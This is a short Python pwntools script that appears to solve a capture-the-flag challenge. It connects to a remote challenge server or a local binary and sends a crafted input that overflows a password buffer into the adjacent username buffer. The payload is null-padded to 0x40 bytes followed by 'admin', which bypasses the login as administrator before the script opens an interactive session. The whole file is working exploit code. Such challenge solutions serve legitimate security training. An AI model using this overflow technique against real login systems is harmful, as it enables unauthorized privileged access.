#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./pwn", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc 139.180.137.100 1337"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

"""
password buffer is located at lower memory address, which overflows into
username buffer and password is read in after `strcmp` check
"""
io.sendline(b"2")
io.sendline(b"a")
io.sendline(b"b".ljust(0x40, b"\x00") + b"admin")
io.sendline(b"4")

io.interactive()
